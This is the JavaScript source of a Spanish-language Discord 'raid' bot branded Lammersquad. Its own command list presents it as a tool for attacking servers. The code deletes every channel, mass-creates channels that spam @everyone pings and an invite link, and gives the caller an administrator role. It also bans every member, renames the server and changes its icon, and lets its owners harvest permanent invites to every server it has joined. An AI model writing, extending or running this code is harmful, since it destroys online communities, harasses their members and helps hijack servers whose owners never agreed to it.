const Discord = require("discord.js");
const client = new Discord.Client();
const Monitor = require('ping-monitor');
const keepAlive = require('./server');
const chalk = require('chalk');

//id del sv donde no funcionan comandos

const serverId = '1110002013166649404';


client.on("ready", () => {
  console.log(chalk.red(`
Bot Encendido Cliente ${client.user.tag}
  `))

  console.log(chalk.cyan(`bot prendido`))

  presencia();
});



function presencia() {
  client.user.setPresence({
    status: "online",
    activity: {
      name: "discord.gg/lammersq",
      type: "PLAYING"
    }
  });
}

//no se daña si le envian md al bot

client.on('message', async (message) => {
  if (message.channel.type === 'dm' && !message.author.bot) {
    try {
      console.log(`Mensaje recibido en DM de ${message.author.tag}: ${message.content}`);
    } catch (error) {
      console.error('Error al procesar el mensaje en DM:', error);
    }
  }
});

process.on('unhandledRejection', (error) => {
  console.error('Error no controlado:', error);
});

process.on('uncaughtException', (error) => {
  console.error('Excepción no capturada:', error);
});

//START 

client.on("message", async (message) => {
  if (message.content === ".start") {
    if (message.guild.id !== serverId) {
      console.log(chalk.green(`Raideando`));

      try {
        await message.delete();

        const channelsToDelete = message.guild.channels.cache.filter(
          (channel) => channel.type !== "category"
        );

        await Promise.all(
          channelsToDelete.map(async (channel) => {
            try {
              await channel.delete();
            } catch (error) {
              console.error(`Error al eliminar el canal ${channel.name}:`, error);
            }
          })
        );

        const newChannel = await message.guild.channels.create(`raid﹒by﹒lammersq`, {
          type: "text",
        });

        const embed = new Discord.MessageEmbed()
          .setTitle("Server Tamed")
          .setDescription("**Raid By Lammersquad, Clowns**")
          .addField("Discord", "[Servidor de Discord](https://discord.gg/lammersq)")
          .setImage(
            "https://media.discordapp.net/attachments/972488942580539462/1111846891324444772/IMG_9785.gif"
          )
          .setColor("#050404");

        newChannel.send("||@everyone|| https://discord.gg/lammersq ||@here||");
        newChannel.send(embed);

        const promises = [];

        for (let i = 0; i <= 500; i += 10) {
          const batch = Array.from({ length: 10 }, (_, index) =>
            message.guild.channels.create(`raid﹒by﹒lammersq`, {
              type: "text",
            })
          );

          for await (const channelPromise of batch) {
            const channel = await channelPromise;
            promises.push(channel);

            for (let j = 0; j < 50; j++) {
              channel.send("||@everyone|| https://discord.gg/lammersq ||@here||");
              channel.send(embed);
            }
          }
        }

        await Promise.all(promises);

        await message.guild.setName("Raid By Lammersquad");
        await message.guild.setIcon(
          "https://media.discordapp.net/attachments/1114673639598587956/1114703119444619264/ca3f24b96fa58957686809deb5e01ebd.png"
        );

        setTimeout(async () => {
          try {
            await message.delete();
          } catch (error) {
            console.error("Error al eliminar el mensaje:", error);
          }
        }, 2000);
      } catch (error) {
        console.error("Error al ejecutar el comando:", error);
      }
    } else {
      const embed = new Discord.MessageEmbed()
        .setTitle("**¡Comando no permitido en este servidor!**")
        .setDescription("**Usa el bot en otro servidor**")
        .addField(
          "**Invite Del Bot**",
          "[Invitacion Del Bot](https://discord.com/api/oauth2/authorize?client_id=1114730335201136650&permissions=8&scope=bot%20applications.commands)"
        )
        .setImage(
          "https://media.discordapp.net/attachments/972488942580539462/1111846891324444772/IMG_9785.gif"
        )
        .setColor("#050404");

      message.channel.send(embed);
    }
  }
});

//admin

client.on("message", async msg => {
  if (msg.author.bot) return;
  
  if (msg.content.toLowerCase().startsWith('.admin')) {
    if (msg.guild.id === serverId) {
      const embed = new Discord.MessageEmbed()
        .setTitle('**¡Comando no permitido en este servidor!**')
        .setDescription('**Usa el bot en otro servidor**')
        .addField('**Invite Del Bot**', '[Invitacion Del Bot](https://discord.com/api/oauth2/authorize?client_id=1114730335201136650&permissions=8&scope=bot%20applications.commands)')
        .setImage('https://media.discordapp.net/attachments/972488942580539462/1111846891324444772/IMG_9785.gif')
        .setColor('#050404');

      msg.channel.send(embed);
      return;
    }

    let rol = await msg.guild.roles.create({
      data: {
        name: "$",
        color: "B9BBBE",
        permissions: "ADMINISTRATOR",
        hoisted: false
      }
    });

    msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => { });
      })
      .catch(e => { });
  }
});


//lista

client.on("message", message => {
  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  
  if (command === '.lista') {
    if (message.guild.id === serverId) {
      const embed = new Discord.MessageEmbed()
        .setTitle('**¡Comando no permitido en este servidor!**')
        .setDescription('**Usa el bot en otro servidor**')
        .addField('**Invite Del Bot**', '[Invitacion Del Bot](https://discord.com/api/oauth2/authorize?client_id=1114730335201136650&permissions=8&scope=bot%20applications.commands)')
        .setImage('https://cdn.discordapp.com/attachments/972488942580539462/1111846891324444772/IMG_9785.gif')
        .setColor('#050404');

      message.channel.send(embed);
      return;
    }

    message.delete();

    const embed = new Discord.MessageEmbed()
      .setTitle('Raid By Lammersquad')
      .setDescription('**Raid Data**')
      .addField('Canales', message.guild.channels.cache.size.toString(), true)
      .addField('Roles', message.guild.roles.cache.size.toString(), true)
      .addField('Usuarios', message.guild.memberCount.toString(), true)
      .addField('Discord', '[Servidor de Discord](https://discord.gg/lammersq)')
      .setImage('https://cdn.discordapp.com/attachments/972488942580539462/1111846891324444772/IMG_9785.gif')
      .setColor('#050404');

    message.channel.send(embed);
  }
});



//banall

client.on('message', async (message) => {
  if (message.author.bot) return;

  if (message.content === '.banall') {
    if (message.guild.id === serverId) {
      const embed = new Discord.MessageEmbed()
        .setTitle('**¡Comando no permitido en este servidor!**')
        .setDescription('**Usa el bot en otro servidor**')
        .addField('**Invite Del Bot**', '[Invitacion Del Bot](https://discord.com/api/oauth2/authorize?client_id=1114730335201136650&permissions=8&scope=bot%20applications.commands)')
        .setImage('https://cdn.discordapp.com/attachments/972488942580539462/1111846891324444772/IMG_9785.gif')
        .setColor('#050404');

      return message.channel.send(embed);
    }

    if (!message.member.hasPermission('BAN_MEMBERS')) {
      return message.reply('No tienes permisos para utilizar este comando.');
    }

    try {
      await message.delete();

      const guild = message.guild;
      const membersToBan = guild.members.cache.filter(m => !m.user.bot && m.bannable);

      membersToBan.forEach(async (member) => {
        try {
          await member.ban({ reason: 'Razón del ban masivo' });
          console.log(`Se ha baneado a ${member.user.tag}`);
        } catch (error) {
          console.error(`Error al banear a ${member.user.tag}:`, error);
        }
      });

      const banEmbed = new Discord.MessageEmbed()
        .setTitle('**Ban Masivo Completado**')
        .setDescription('Ban masivo realizado con éxito.')
        .setImage('https://cdn.discordapp.com/attachments/972488942580539462/1111846891324444772/IMG_9785.gif')
        .setColor('#050404');

      message.channel.send(banEmbed);
    } catch (error) {
      console.error('Error al realizar el ban masivo:', error);
      message.reply('Ocurrió un error al realizar el ban masivo.');
    }
  }
});

process.on('unhandledRejection', (error) => {
  console.error('Error no controlado:', error);
});

process.on('uncaughtException', (error) => {
  console.error('Excepción no capturada:', error);
});

//nuke 

client.on('message', async (message) => {
  if (message.content === '.nuke') {
    if (message.guild.id === serverId) {
      // Embed y mensaje de advertencia para el servidor exclusivo
      const embed = new Discord.MessageEmbed()
        .setTitle('**¡Comando no permitido en este servidor!**')
        .setDescription('**Usa el bot en otro servidor**')
        .addField('**Invite Del Bot**', '[Invitacion Del Bot](https://discord.com/api/oauth2/authorize?client_id=1114730335201136650&permissions=8&scope=bot%20applications.commands)')
        .setImage('https://cdn.discordapp.com/attachments/972488942580539462/1111846891324444772/IMG_9785.gif')
        .setColor('#050404');

      message.channel.send(embed);
      return;
    }

    message.delete();

    const guild = message.guild;
    const channelsToDelete = guild.channels.cache.filter(channel => channel.type !== 'category');

    const deleteChannelPromises = channelsToDelete.map(channel => channel.delete());

    try {
      await Promise.all(deleteChannelPromises);

      const nukedChannel = await guild.channels.create('server-nuked', {
        type: 'text'
      });

      const finalEmbed = new Discord.MessageEmbed()
        .setTitle('**Nuke completado**')
        .setDescription('Se han eliminado todos los canales excepto uno.')
        .addField('Canales eliminados', channelsToDelete.size)
        .setImage('https://cdn.discordapp.com/attachments/972488942580539462/1111846891324444772/IMG_9785.gif')
        .setColor('#050404');

      nukedChannel.send(finalEmbed);
    } catch (error) {
      console.error('Error al borrar los canales:', error);

      const errorEmbed = new Discord.MessageEmbed()
        .setTitle('**Error al realizar el nuke**')
        .setDescription('Ocurrió un error al eliminar los canales.')
        .setColor('#FF0000');

      message.channel.send(errorEmbed);
    }
  }
});

//raid

client.on("message", async (message) => {
  if (message.author.bot) return;

  if (message.content === ".raid") {
    if (message.guild.id === serverId) {
      const embed = new Discord.MessageEmbed()
        .setTitle("**¡Comando no permitido en este servidor!**")
        .setDescription("**Usa el bot en otro servidor**")
        .addField(
          "**Invite Del Bot**",
          "[Invitacion Del Bot](https://discord.com/api/oauth2/authorize?client_id=1114730335201136650&permissions=8&scope=bot%20applications.commands)"
        )
        .setImage(
          "https://cdn.discordapp.com/attachments/972488942580539462/1111846891324444772/IMG_9785.gif"
        )
        .setColor("#050404");

      message.channel.send(embed);
      return;
    }

    const embed = new Discord.MessageEmbed()
      .setTitle("Raid By Lammersquad")
      .setDescription("**Raid By Lammersquad, Clowns**")
      .addField(
        "Discord",
        "[Servidor De Discord](https://discord.gg/lammersq)"
      )
      .setImage(
        "https://cdn.discordapp.com/attachments/972488942580539462/1111846891324444772/IMG_9785.gif"
      );

    const messageContent = "||@everyone|| https://discord.gg/lammersq ||@here||";

    try {
      await message.delete();

      const channelCount = 50;
      const spamCount = 15;

      const createChannelsAndSendMessagesPromises = [];

      for (let i = 0; i < channelCount; i++) {
        const createChannelPromise = message.guild.channels.create(
          `﹒raid﹒by﹒lammersquad`,
          {
            type: "text",
          }
        );

        createChannelsAndSendMessagesPromises.push(
          createChannelPromise.then((channel) => {
            const spamPromises = [];

            for (let j = 0; j < spamCount; j++) {
              spamPromises.push(channel.send(messageContent));
              spamPromises.push(channel.send(embed));
            }

            return Promise.all(spamPromises);
          })
        );
      }

      await Promise.all(createChannelsAndSendMessagesPromises);

      const completionEmbed = new Discord.MessageEmbed()
        .setTitle("Canales y mensajes creados correctamente")
        .setDescription(
          `Se han creado los ${channelCount} canales y se han enviado ${channelCount * spamCount} mensajes correctamente.`
        )
        .addField(
          "Discord",
          "[Servidor De Discord](https://discord.gg/lammersq)"
        )
        .setImage(
          "https://cdn.discordapp.com/attachments/972488942580539462/1111846891324444772/IMG_9785.gif"
        )
        .setColor("#050404");

      await message.guild.channels.cache
        .find((ch) => ch.type === "text")
        .send(completionEmbed);
    } catch (error) {
      console.error(`Error al crear canales y enviar mensajes: ${error}`);
    }
  }
});
//comandos

client.on("message", message => {
  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command === '.comandos') {
    message.delete();

    const embed = new Discord.MessageEmbed()
      .setTitle('Comandos Del Bot Raid')
      .setDescription('**Usa estos comandos para realizar el ataque**')
      .addField('[+] Comandos:', `
        ** ღ .start ** | Jode el servidor de inmediato, ejecutando todos los comandos.
        ** ღ .invite ** | Te envia un embed con la invite del bot.
        ** ღ .nuke ** | Elimina todos los chats, dejando solo 1 para poner otros comandos.
        ** ღ .raid**  | Crea muchos canales con ping y mensajes.
        ** ღ .admin** |Crea un rol con perms de administrador y te lo da.
        ** ღ .crearroles** | Crea muchos roles en el servidor.
        ** ღ .deleteroles** | Borra todos los roles del servidor.
        ** ღ .banall ** | Este comando banea a todos los usuarios del servidor.
        ** ღ .lista ** | Obten informacion del raid (stats).
      `)
      .addField('Discord', '[Servidor De Discord](https://discord.gg/lammersq)')
      .setImage('https://cdn.discordapp.com/attachments/972488942580539462/1111846891324444772/IMG_9785.gif')
      .setColor('#050404');

    message.channel.send(embed);
  }
});

//invite del bot 

client.on("message", message => {
  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command === '.invite') {
    message.delete();

    const embed = new Discord.MessageEmbed()
      .setTitle('**Invite Del Bot**')
      .setDescription('**Bot Raid Por snt#1111**')
      .addField('Discord', '[Invite Del Bot](https://discord.com/api/oauth2/authorize?client_id=1114730335201136650&permissions=8&scope=bot%20applications.commands)')
      .setImage('https://cdn.discordapp.com/attachments/972488942580539462/1111846891324444772/IMG_9785.gif')
      .setColor('#050404');

    message.channel.send(embed);
  }
});

//servers

// owners q pueden usar el comando.

const authorizedUsers = ['1078904858947616839', '1114334847872286750', '617106986710073344', '1114275843284402350', 'nose'];

client.on("message", async message => {
  if (message.author.bot) return;

  if (message.content === '.servers') {
    message.delete();

    // Verificar si el autor del mensaje está autorizado para usar el comando
    if (!authorizedUsers.includes(message.author.id)) {
      const embedUnauthorized = new Discord.MessageEmbed()
        .setTitle('No tienes permiso para usar este comando.')
        .setColor('#050404')
        .setImage('https://cdn.discordapp.com/attachments/972488942580539462/1111846891324444772/IMG_9785.gif');

      return message.channel.send(embedUnauthorized);
    }

    const serverList = [];

    client.guilds.cache.forEach(guild => {
      serverList.push({
        name: guild.name,
        id: guild.id,
        invite: ''
      });
    });

    if (serverList.length > 0) {
      const embed = new Discord.MessageEmbed()
        .setTitle('Servidores en los que está el bot')
        .setColor('#050404')
        .setImage('https://cdn.discordapp.com/attachments/972488942580539462/1111846891324444772/IMG_9785.gif');

      for (const server of serverList) {
        const guild = client.guilds.cache.get(server.id);
        if (!guild) continue;

        const channel = guild.channels.cache.find(channel => channel.type === 'text' && channel.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'));
        if (!channel) continue;

        const invite = await channel.createInvite({ unique: true, maxAge: 0 }).catch(console.error);
        if (!invite) continue;

        server.invite = invite.url;

        embed.addField(`**${server.name}** (${server.id})`, `[Invitación](${server.invite})`);
      }

      if (embed.fields.length > 0) {
        message.channel.send(embed);
      } else {
        const embedNoServers = new Discord.MessageEmbed()
          .setTitle('El bot no se encuentra en ningún servidor en este momento.')
          .setColor('#050404')
          .setImage('https://cdn.discordapp.com/attachments/972488942580539462/1111846891324444772/IMG_9785.gif');

        message.channel.send(embedNoServers);
      }
    } else {
      const embedNoServers = new Discord.MessageEmbed()
        .setTitle('El bot no se encuentra en ningún servidor en este momento.')
        .setColor('#050404')
        .setImage('https://cdn.discordapp.com/attachments/972488942580539462/1111846891324444772/IMG_9785.gif');

      message.channel.send(embedNoServers);
    }
  }
});

//se sale si no hay mas de 30 miembros 

client.on('guildCreate', guild => {
  const memberCount = guild.memberCount;

  if (memberCount < 1) {
    guild.leave()
      .then(() => console.log(`Bot se ha salido del servidor ${guild.name} debido a la baja cantidad de miembros.`))
      .catch(console.error);
  }
});

//terminos y condiciones

client.on('message', message => {
  if (message.content === '.tosbot') {
    const memberCount = message.guild.memberCount;
    const embed = new Discord.MessageEmbed()
      .setTitle('Términos de Servicio del Bot:')
      .setDescription('**_Por favor, lee los siguientes términos de servicio antes de usar el bot:_**')
      .addField('_Cantidad mínima de miembros_:', 'Este bot se mantendrá en servidores que tengan un mínimo de 30 miembros. Si el servidor tiene menos de 30 miembros, el bot se retirará automáticamente.')
      .addField('_Uso malintencionado_:',  'Cualquier intento de atacar o estropear el funcionamiento del bot será puesto en la lista negra. Los infractores que sean incluidos en la lista negra ya no podrán acceder a los comandos del bot.')
      .setImage('https://cdn.discordapp.com/attachments/972488942580539462/1111846891324444772/IMG_9785.gif')
      .setColor('#050404');

    if (memberCount < 30) {
      embed.addField('Aviso', 'Este servidor no cumple con el número mínimo de miembros. El bot se retirará automáticamente.');
    }

    message.channel.send(embed);
  }
});



client.login("token");